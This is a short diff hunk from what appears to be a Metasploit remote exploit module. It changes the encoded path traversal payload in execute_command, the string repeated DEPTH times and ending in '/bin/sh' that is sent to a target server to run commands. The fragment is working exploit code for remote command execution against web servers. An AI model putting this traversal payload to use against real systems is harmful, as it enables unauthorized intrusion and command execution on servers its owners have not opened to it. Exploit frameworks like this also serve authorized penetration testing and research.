@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def execute_command(command, _opts = {})
-    traversal = '%%32%65%%32%65/' * datastore['DEPTH'] << '/bin/sh'
+    traversal = '.%%32%65/' * datastore['DEPTH'] << '/bin/sh'
 
     uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
     response = send_request_raw({
